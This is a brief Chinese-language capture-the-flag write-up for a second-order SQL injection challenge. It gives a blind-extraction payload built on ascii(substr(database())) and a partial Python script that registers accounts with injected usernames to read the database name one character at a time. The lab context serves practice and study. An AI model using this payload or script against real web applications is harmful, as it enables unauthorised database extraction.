二次注入？

开始给了一个登录的页面，emmm，猜测register.php(当然你也可以扫一下)，注册之后登陆然后进入主页，主页有用户名，判断有二次注入，算是半拉盲注？然后可以测试一下单引号，双引号，然后就是单引号闭合，emmm过滤了,可以用下面的语句注入

'+ascii(substr((database()) from " + str(i) + " for 1))+'

emmm，表名要猜？！！好家伙，我也不会，贴下俺根据wp写的脚本
# -*- coding: utf-8 -*-

import requests
from bs4 import BeautifulSoup
import time


def get_database(username, email):
    # 注册部分
    url = "http://c20af613-209f-4645-b6fa-a362921f30fc.node3.buuoj.cn/"
    register_data = {
        "username": username,
        "email": email,
        "password": "11"
    }
    response = requests.post(url + "register.php", register_data)
    register_text = response.text

    # 登陆部分
    login_data = {
        "email": email,
        "password": "11"
    }
    login_response = requests.post(url + "login.php", login_data)
    login_text = login_response.text
    soup = BeautifulSoup(login_text, 'html.parser')
    get_username = soup.find_all('span')[0]
    sql_username = get_username.text
    sql_username = str.strip(sql_username)  # 获取index页面的用户名
    if int(sql_username) != 0:
        return chr(int(sql_username))
    else:
        return 0
